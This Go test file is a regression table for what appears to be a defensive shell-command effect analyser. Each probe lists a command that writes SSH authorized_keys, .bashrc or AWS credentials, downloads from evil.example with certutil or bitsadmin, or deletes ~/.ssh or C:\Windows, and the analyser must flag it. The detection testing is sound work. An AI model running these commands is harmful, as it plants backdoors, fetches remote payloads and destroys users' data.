// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// SPDX-License-Identifier: Apache-2.0

package effects

import (
	"sort"
	"strings"
	"testing"
)

// review_all_test.go is the single permanent regression table for the effect
// model: one row per probe ID from the Opus 5.5 reviews 1-6 and the review-6
// confirmation (the comprehensive protected-file false-KNOWN hunt plus every
// class A/B/C/D leftover and the psparse review-5/6 guards). Each row freezes a
// verdict string (fully-known status + the set of KNOWN mutation keys). CI fails
// if any row regresses. A row whose `real` protected target is named must never
// come out fully known with no known mutation at that target (the confirmation's
// "WRONG" class). Functional (non-protected-file) quoting/glob/number probes
// from reviews 1-4 stay covered by review_regress_test.go, the mutation
// self-audit and the fuzz targets.

var (
	raLin     = Options{Flavor: FlavorPOSIX, Home: "/home/u", CWD: "/home/u/proj", Env: map[string]string{"HOME": "/home/u"}}
	raLinHome = Options{Flavor: FlavorPOSIX, Home: "/home/u", CWD: "/home/u", Env: map[string]string{"HOME": "/home/u"}}
	raLinPS   = Options{Flavor: FlavorPOSIX, Home: "/home/u", CWD: "/home/u", Dialect: DialectPowerShell, Env: map[string]string{"HOME": "/home/u"}}
	raMac     = Options{Flavor: FlavorPOSIX, Home: "/Users/u", CWD: "/Users/u/proj", CaseInsensitive: true, Env: map[string]string{"HOME": "/Users/u"}}
	raCmd     = Options{Flavor: FlavorWindows, Dialect: DialectCMD, Home: `C:\Users\u`, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Env: map[string]string{"USERPROFILE": `C:\Users\u`}}
	raPS      = Options{Flavor: FlavorWindows, Dialect: DialectPowerShell, Home: `C:\Users\u`, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Env: map[string]string{"USERPROFILE": `C:\Users\u`}}
	raGB      = Options{Flavor: FlavorWindows, Dialect: DialectPOSIX, Home: `C:\Users\u`, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Env: map[string]string{"HOME": `C:\Users\u`, "USERPROFILE": `C:\Users\u`}}
	raWinNone = Options{Flavor: FlavorWindows, Dialect: DialectNone, Home: `C:\Users\u`, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Env: map[string]string{"USERPROFILE": `C:\Users\u`}}
)

type arow struct {
	id   string
	o    Options
	cmd  string
	real string // the real protected target this command mutates, "" if none/dynamic
}

// raVerdict is the frozen classification: K|<keys> when every effect is known,
// else U|<keys>, where <keys> is the sorted set of KNOWN mutation targets.
func raVerdict(r Result) string {
	var keys []string
	for _, e := range r.Effects {
		switch e.Kind {
		case KindWrite, KindAppend, KindDelete, KindLink, KindPermissionChange:
			if e.TargetState == TargetStateKnown && e.Target.Type == TargetPath && e.Target.Key() != "" {
				k := string(e.Kind) + ":" + e.Target.Key()
				if e.Target.Subtree {
					k += "/**"
				}
				keys = append(keys, k)
			}
		}
	}
	sort.Strings(keys)
	fk := "U"
	if r.FullyKnown() {
		fk = "K"
	}
	return fk + "|" + strings.Join(keys, ",")
}

var allProbes = []arow{
	{"P01 cd..cd chain", raLin, `cd ~/.ssh && cd .. && echo k >> .ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P02 env -C", raLin, `env -C /home/u/.ssh tee -a authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P03 sudo -D", raLin, `sudo -u u -D /home/u/.ssh tee -a authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P04 nice timeout install", raLin, `nice -n 5 timeout 3 install -m 600 /tmp/x ~/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P05 ln -sf rc", raLin, `ln -sf /tmp/x ~/.bashrc`, "/home/u/.bashrc"},
	{"P06 cp -t dir", raLin, `cp -t ~/.ssh /tmp/x/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P07 mv src -t dir", raLin, `mv /tmp/x/config -t /home/u/.ssh`, "/home/u/.ssh/config"},
	{"P08 double slash", raLin, `echo k >> ~//.ssh//authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P09 exec fd redirect", raLin, `exec 3>>~/.ssh/authorized_keys; echo k >&3`, `/home/u/.ssh/authorized_keys`},
	{"P10 group redirect", raLin, `{ echo k; } >> ~/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P11 pushd", raLin, `pushd ~/.ssh >/dev/null; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P12 dd of=$HOME", raLin, `dd if=/tmp/x of=$HOME/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P13 bare cd", raLin, `cd; echo k >> .ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P14 CDPATH prefix", raLin, `CDPATH=/home/u cd .ssh && echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P15 CDPATH set", raLin, `CDPATH=/home/u; cd .ssh; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P16 OLDPWD cd -", raLin, `OLDPWD=/home/u/.ssh; cd -; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P17 cd then sh -c", raLin, `cd ~/.ssh; sh -c 'echo k >> authorized_keys'`, `/home/u/.ssh/authorized_keys`},
	{"P18 heredoc", raLin, "cat > ~/.ssh/authorized_keys <<'E'\nk\nE", `/home/u/.ssh/authorized_keys`},
	{"P19 in-call symlink dir", raLin, `ln -s ~/.ssh /tmp/s; echo k >> /tmp/s/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P20 in-call symlink file", raLin, `ln -s ~/.bashrc /tmp/r; echo x >> /tmp/r`, "/home/u/.bashrc"},
	{"P21 relative symlink in cwd", raLin, `cd /tmp/w && ln -s /home/u/.ssh s && echo k >> s/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P22 HOME reassigned, cd", raLin, `HOME=/home/u/.ssh; cd; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P23 HOME reassigned, tilde", raLin, `HOME=/home/u/.ssh; echo k >> ~/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P24 HOME export tilde", raLin, `export HOME=/home/u/.ssh; echo k >> ~/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P25 var alias", raLin, `H=~/.ssh; echo k >> $H/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P26 param op", raLin, `echo k >> ${HOME%/}/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P27 set -- positional", raLin, `set -- ~/.ssh; cd "$1"; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P28 command cd", raLin, `command cd ~/.ssh; echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P29 builtin cd", raLin, `builtin cd ~/.ssh && echo k >> authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P30 exec bash -c after cd", raLin, `cd ~/.ssh; exec bash -c 'echo k >> authorized_keys'`, `/home/u/.ssh/authorized_keys`},
	{"P31 rsync", raLin, `rsync /tmp/x ~/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P32 tee -a absolute via ..", raLin, `cd /home/u/.ssh/../.ssh && echo k > authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P33 ln hard into cwd", raLin, `cd ~/.ssh; ln /tmp/k authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P34 cp dest dir trailing", raLin, `cp /tmp/x/.zshrc ~/`, "/home/u/.zshrc"},
	{"P35 aws creds tee", raLin, `cd ~/.aws; tee credentials < /tmp/c`, "/home/u/.aws/credentials"},
	{"P36 claude settings via cd -P", raLin, `cd -P ~/.claude && echo {} > settings.json`, "/home/u/.claude/settings.json"},
	{"P37 xargs -I cp", raLin, `echo /tmp/x | xargs -I{} cp {} ~/.ssh/authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P38 find -exec cp", raLin, `find /tmp/x -name k -exec cp {} /home/u/.ssh/authorized_keys \;`, `/home/u/.ssh/authorized_keys`},
	{"P39 git -C", raLin, `git -C ~/.ssh checkout evil -- authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"P40 tar -C extract", raLin, `tar -xf /tmp/a.tar -C ~/.ssh authorized_keys`, `/home/u/.ssh/authorized_keys`},
	{"M01 mac mixed case", raMac, `echo k >> /Users/u/.SSH/Authorized_Keys`, "/users/u/.ssh/authorized_keys"},
	{"M02 mac cd mixed case", raMac, `cd /USERS/u/.ssh; echo k >> authorized_keys`, "/users/u/.ssh/authorized_keys"},
	{"M03 mac /private/var alias", raMac, `cd /var/../Users/u/.ssh; echo k >> authorized_keys`, "/users/u/.ssh/authorized_keys"},
	{"C01 cd /d", raCmd, `cd /d C:\Users\u\.ssh && echo k>>authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C02 pushd", raCmd, `pushd C:\Users\u\.ssh & echo k >> authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C03 cd %USERPROFILE%", raCmd, `cd %USERPROFILE%\.ssh & echo k>>authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C04 copy dest dir", raCmd, `copy C:\t\authorized_keys C:\Users\u\.ssh\`, `c:\users\u\.ssh\authorized_keys`},
	{"C05 xcopy dest dir", raCmd, `xcopy C:\t\authorized_keys C:\Users\u\.ssh\ /y`, `c:\users\u\.ssh\authorized_keys`},
	{"C06 mklink", raCmd, `mklink C:\Users\u\.ssh\authorized_keys C:\t\a`, `c:\users\u\.ssh\authorized_keys`},
	{"C07 forward slashes", raCmd, `echo k>>C:/Users/u/.ssh/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C08 8.3 name", raCmd, `echo k >> C:\Users\u\.ssh\AUTHOR~1`, `c:\users\u\.ssh\authorized_keys`},
	{"C09 cd then cmd /c", raCmd, `cd C:\Users\u\.ssh & cmd /c "echo k>>authorized_keys"`, `c:\users\u\.ssh\authorized_keys`},
	{"C10 trailing dot", raCmd, `echo k >> C:\Users\u\.ssh\authorized_keys.`, `c:\users\u\.ssh\authorized_keys`},
	{"C11 cd .. relative", raCmd, `cd ..\Users\u\.ssh & echo k>>authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C12 drive-relative after drive switch", raCmd, `cd /d C:\Users\u\.ssh & D: & echo k >> C:authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C13 pushd UNC", raCmd, `pushd \\localhost\c$\Users\u\.ssh & echo k>>authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C14 cd \\ root-relative", raCmd, `cd \Users\u\.ssh & echo k >> authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C15 move", raCmd, `move /y C:\t\a C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C16 caret in path", raCmd, `echo k>>C:\Users\u\.s^sh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"C17 quoted space redirect", raCmd, `type C:\t\a > "C:\Users\u\.ssh\authorized_keys"`, `c:\users\u\.ssh\authorized_keys`},
	{"C18 ProgramData DC", raCmd, `cd /d C:\ProgramData\DefenseClaw & echo x>config.yaml`, `c:\programdata\defenseclaw\config.yaml`},
	{"S01 Set-Location ~\\", raPS, `Set-Location ~\.ssh; Add-Content authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"S02 cd $HOME", raPS, `cd $HOME\.ssh; 'k' | Out-File -Append authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"S03 Push-Location env", raPS, `Push-Location $env:USERPROFILE\.ssh; ac authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"S04 .NET AppendAllText", raPS, `[IO.File]::AppendAllText("$HOME\.ssh\authorized_keys","k")`, `c:\users\u\.ssh\authorized_keys`},
	{"S05 Copy-Item dest dir", raPS, `Copy-Item C:\t\authorized_keys -Destination ~\.ssh\`, `c:\users\u\.ssh\authorized_keys`},
	{"S06 New-Item symlink", raPS, `New-Item -ItemType SymbolicLink -Path C:\Users\u\.ssh\authorized_keys -Target C:\t\a`, `c:\users\u\.ssh\authorized_keys`},
	{"S07 -LiteralPath quoted", raPS, `Set-Content -LiteralPath 'C:\Users\u\.ssh\authorized_keys' -Value k`, `c:\users\u\.ssh\authorized_keys`},
	{"S08 redirect fwd slash", raPS, `"k" > ~/.ssh/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"S09 var path", raPS, `$p = "$HOME\.ssh"; Set-Content -Path "$p\authorized_keys" -Value k`, `c:\users\u\.ssh\authorized_keys`},
	{"S10 cd chain relative", raPS, `cd C:\Users\u; cd .ssh; Add-Content -Path .\authorized_keys -Value k`, `c:\users\u\.ssh\authorized_keys`},
	{"S11 Move-Item -Force", raPS, `Move-Item -Path C:\t\a -Destination C:\Users\u\.ssh\authorized_keys -Force`, `c:\users\u\.ssh\authorized_keys`},
	{"S12 colon param", raPS, `Add-Content -Path:C:\Users\u\.ssh\authorized_keys -Value:k`, `c:\users\u\.ssh\authorized_keys`},
	{"S13 -Stream", raPS, `Add-Content -Path ~\.ssh\authorized_keys -Value k -Stream x`, `c:\users\u\.ssh\authorized_keys`},
	{"S14 Out-File -FilePath", raPS, `Out-File -FilePath $HOME/.ssh/authorized_keys -InputObject k`, `c:\users\u\.ssh\authorized_keys`},
	{"S15 Start-Process -WorkingDirectory", raPS, `Start-Process -WorkingDirectory C:\Users\u\.ssh cmd -ArgumentList '/c','echo k>>authorized_keys'`, `c:\users\u\.ssh\authorized_keys`},
	{"S16 Tee-Object", raPS, `Tee-Object -FilePath C:\Users\u\.ssh\authorized_keys -Append -InputObject k`, `c:\users\u\.ssh\authorized_keys`},
	{"S17 Rename-Item NewName", raPS, `Rename-Item C:\Users\u\.ssh\a -NewName authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"S18 Copy-Item positional", raPS, `Copy-Item C:\t\a C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"S19 Program Files ..", raPS, `cd 'C:\Program Files\..\Users\u\.ssh'; ac authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"S20 pwsh -c from cmd", raCmd, `powershell -c "cd ~\.ssh; ac authorized_keys k"`, `c:\users\u\.ssh\authorized_keys`},
	{"S21 Set-Location -Path", raPS, `Set-Location -Path C:\Users\u\.ssh; Set-Content authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"S22 Join-Path", raPS, `Set-Content (Join-Path $HOME '.ssh\authorized_keys') k`, `c:\users\u\.ssh\authorized_keys`},
	{"S23 provider path", raPS, `Set-Content Microsoft.PowerShell.Core\FileSystem::C:\Users\u\.ssh\authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"S24 New-Item -Name", raPS, `New-Item -Path C:\Users\u\.ssh -Name authorized_keys -Value k`, `c:\users\u\.ssh\authorized_keys`},
	{"G01 cd ~ relative", raGB, `cd ~/.ssh && echo k >> authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G02 /c mount", raGB, `echo k >> /c/Users/u/.ssh/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G03 C:/ form", raGB, `echo k >> C:/Users/u/.ssh/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G04 cd /c then rel", raGB, `cd /c/Users/u; echo k >> .ssh/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G05 $USERPROFILE", raGB, `echo k >> "$USERPROFILE/.ssh/authorized_keys"`, `c:\users\u\.ssh\authorized_keys`},
	{"G06 /cygdrive cd", raGB, `cd /cygdrive/c/Users/u/.ssh; echo k>>authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G07 quoted backslash", raGB, `echo k >> 'C:\Users\u\.ssh\authorized_keys'`, `c:\users\u\.ssh\authorized_keys`},
	{"G08 escaped backslash", raGB, `echo k >> C:\\Users\\u\\.ssh\\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G09 cmd //c", raGB, `cmd //c "echo k>>C:\Users\u\.ssh\authorized_keys"`, `c:\users\u\.ssh\authorized_keys`},
	{"G10 ln -s in .ssh", raGB, `cd ~; cd .ssh; ln -s /c/t/a authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G11 HOME reassigned cd", raGB, `HOME=/c/Users/u/.ssh; cd; echo k >> authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"G12 cp dest dir", raGB, `cp /c/t/authorized_keys ~/.ssh/`, `c:\users\u\.ssh\authorized_keys`},
	{"G13 mixed case drive", raGB, `echo k >> /C/USERS/U/.SSH/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"V1 CDPATH prefix ;", raLin, `CDPATH=/home/u cd .ssh; echo k >> authorized_keys`, dynamicTarget},
	{"V2 CDPATH prefix tilde", raLin, `CDPATH=~ cd .ssh && tee -a authorized_keys < /tmp/k`, dynamicTarget},
	{"V3 CDPATH prefix pushd", raLin, `CDPATH=/home/u pushd .ssh && echo k >> authorized_keys`, dynamicTarget},
	{"V4 CDPATH env wrapper n/a (cd not exec)", raLin, `env CDPATH=/home/u bash -c 'cd .ssh && echo k >> authorized_keys'`, dynamicTarget},
	{"V5 CDPATH exported earlier", raLin, `export CDPATH=/home/u; cd .ssh; echo k >> authorized_keys`, dynamicTarget},
	{"V6 CDPATH prefix bashrc", raLin, `CDPATH=/ cd home/u && echo x >> .bashrc`, dynamicTarget},
	{"V7 cmd-flavor gitbash CDPATH", raGB, `CDPATH=/c/Users/u cd .ssh && echo k >> authorized_keys`, dynamicTarget},
	{"W1 gb HOME tilde", raGB, `HOME=/c/Users/u/.ssh; echo k >> ~/authorized_keys`, rwAK},
	{"W2 gb HOME C:/ cd", raGB, `HOME=C:/Users/u/.ssh; cd; echo k >> authorized_keys`, rwAK},
	{"W3 gb export HOME cd", raGB, `export HOME=/c/Users/u/.ssh; cd && echo k >> authorized_keys`, rwAK},
	{"W4 gb HOME cd ~", raGB, `HOME=/c/Users/u/.ssh; cd ~; echo k >> authorized_keys`, rwAK},
	{"W5 gb HOME prefix cd", raGB, `HOME=/c/Users/u/.ssh cd; echo k >> authorized_keys`, rwAK},
	{"W6 lin HOME prefix cd", raLin, `HOME=/home/u/.ssh cd; echo k >> authorized_keys`, rlAK},
	{"W7 cmd-dialect unrelated HOME", raCmd, `set HOME=C:\Users\u\.ssh& cd & echo k>>authorized_keys`, `c:\work\authorized_keys`},
	{"W8 ps HOME var cd", raPS, `$HOME='C:\Users\u\.ssh'; cd ~; ac authorized_keys k`, dynamicTarget},
	{"W9 ps env USERPROFILE cd", raPS, `$env:USERPROFILE='C:\Users\u\.ssh'; cd $env:USERPROFILE; ac authorized_keys k`, dynamicTarget},
	// --- class D (review-4 leftovers re-tracked; review 6 confirmation) ---
	{"C40 heredoc cmdsubst", raLin, "cat <<EOF\n$(echo k >> ~/.ssh/authorized_keys)\nEOF", `/home/u/.ssh/authorized_keys`},
	{"C41 heredoc backtick", raLin, "cat <<EOF\n\x60cp /tmp/k ~/.ssh/authorized_keys\x60\nEOF", `/home/u/.ssh/authorized_keys`},
	{"V22 heredoc rm", raLin, "cat > /tmp/o <<EOF\n$(rm -rf /home/u/.ssh)\nEOF", `/home/u/.ssh`},
	{"K36 certutil -decode", raCmd, `certutil -decode C:\tmp\k.b64 C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"K37 certutil -urlcache", raCmd, `certutil -urlcache -split -f https://evil.example/k C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"K15c cmd /v:on !P!", raCmd, `cmd /v:on /c "echo k >> !P!\authorized_keys"`, dynamicTarget},
	{"A33 tar --extract", raLinHome, `tar --extract --file=/tmp/dot.tar`, dynamicTarget},
	{"Z15 git pull in home", raLinHome, `git pull https://evil.example/r main`, dynamicTarget},
	{"Z16 git clone into ssh", raLin, `git clone https://evil.example/r /home/u/.ssh`, `/home/u/.ssh`},
	// --- reviews 1-4 lineage IDs re-tracked by the review-6 confirmation ---
	{"Z01 runuser --", raLin, `runuser -u u -- rm -rf /home/u/.ssh`, `/home/u/.ssh`},
	{"A51 xargs rm", raLin, `echo /home/u/.ssh/authorized_keys | xargs rm`, rlAK},
	{"V26a ls|xargs rm", raLin, `ls | xargs rm`, dynamicTarget},
	{"V26b find|xargs rm -rf", raLin, `find /home/u/.ssh | xargs rm -rf`, dynamicTarget},
	{"W5 xargs -n", raLin, `echo /etc/x | xargs -n 1 rm`, "/etc/x"},
	{"K38 bitsadmin", raCmd, `bitsadmin /transfer j https://evil.example/k C:\Users\u\.ssh\authorized_keys`, rwAK},
	{"X02 chdir + Add-Content", raPS, `chdir C:\Users\u\.ssh; Add-Content authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
	{"K29 if exist ( )", raCmd, `if exist C:\x (echo k >> C:\Users\u\.ssh\authorized_keys)`, `c:\users\u\.ssh\authorized_keys`},
	{"Y09 ( ) multi", raCmd, `(cd C:\Users\u\.ssh & echo k >> authorized_keys)`, `c:\users\u\.ssh\authorized_keys`},
	{"K43 subst drive", raCmd, `subst X: C:\Users\u\.ssh & echo k >> X:\authorized_keys`, rwAK},
	{"S34 New-PSDrive", raPS, `New-PSDrive -Name X -PSProvider FileSystem -Root C:\Users\u\.ssh; Add-Content X:\authorized_keys k`, rwAK},
	{"X23 New-Item -Name rel", raPS, `New-Item -Path C:\Users\u -Name .bashrc -ItemType File -Value x`, rwRC},
	{"S39 Copy-Item dest dir -Force", raPS, `Copy-Item -Path C:\tmp\x\authorized_keys -Destination C:\Users\u\.ssh -Force`, `c:\users\u\.ssh\authorized_keys`},
	{"Z38 rsync into ~/", raLin, `rsync -a /tmp/dots/ ~/`, dynamicTarget},
	{"K05 robocopy", raCmd, `robocopy C:\tmp\x C:\Users\u\.ssh authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
	{"S10 New-Item -Path -Name", raPS, `New-Item -Path C:\Users\u\.ssh -Name authorized_keys -Value k -Force`, `c:\users\u\.ssh\authorized_keys`},
	{"A58 ln -s into dir", raLin, `ln -s /tmp/x/authorized_keys ~/.ssh/`, `/home/u/.ssh/authorized_keys`},
	{"S36 -Path array", raPS, `Add-Content -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys -Value k`, rwAK},
	{"X24 -Path array del", raPS, `Remove-Item -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys`, rwAK},
	{"X25 -Path array quoted", raPS, `Set-Content -Path 'C:\tmp\a','C:\Users\u\.ssh\authorized_keys' -Value k`, rwAK},
	// --- psparse review-5 P1 (Start-Process / host quote / wildcard) ---
	{"R5-1a SP embedded quote", raPS, `Start-Process powershell -ArgumentList '-c','New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
	{"R5-1b host embedded quote", raPS, `powershell -c 'New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
	{"R5-2 string ArgumentList", raPS, `Start-Process powershell -ArgumentList '-c "Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
	{"R5-3 quoted wildcard", raLinPS, `Remove-Item '/etc/pass[w]d'`, dynamicTarget},
	{"R5-4 SP -a prefix", raPS, `Start-Process powershell -a '-c','Remove-Item C:\Windows -Recurse'`, dynamicTarget},
	{"R5-5 dyn before /c", raPS, `Start-Process cmd -ArgumentList $a,'rd /s /q C:\Windows'`, dynamicTarget},
	// --- psparse review-6 (stdin -, cmd no-payload, launchers) ---
	{"R6-1a stdin -c -", raPS, `'Remove-Item C:\Windows -Recurse' | pwsh -c -`, dynamicTarget},
	{"R6-1b bare -", raPS, `pwsh -nop -`, dynamicTarget},
	{"R6-1c powershell -Command -", raPS, `powershell -NoProfile -Command -`, dynamicTarget},
	{"R6-2a fused /crd", raCmd, `cmd /crd /s /q C:\Windows`, dynamicTarget},
	{"R6-2b /d/c", raCmd, `cmd /d/c rd /s /q C:\Windows`, dynamicTarget},
	{"R6-2c quoted /c", raCmd, `cmd "/c rd /s /q C:\Windows"`, dynamicTarget},
	{"R6-2d splat into cmd", raPS, `$a=@('/c','rd /s /q C:\Windows'); cmd @a`, dynamicTarget},
	{"R6-4a Start-Process wt", raPS, `Start-Process wt 'powershell -c Remove-Item C:\Windows -Recurse'`, dynamicTarget},
	{"R6-4b direct wt", raPS, `wt powershell -c Remove-Item C:\Windows -Recurse`, dynamicTarget},
	{"R6-4c cmd /c start", raCmd, `cmd /c start rd /s /q C:\Windows`, dynamicTarget},
	{"R6-4d conhost", raPS, `conhost powershell -c Remove-Item C:\Windows`, dynamicTarget},
}

func TestReviewAllRegression(t *testing.T) {
	for _, c := range allProbes {
		checkRow(t, c.id, c.o, Call{Surface: SurfaceShell, Command: c.cmd}, c.real)
	}
}
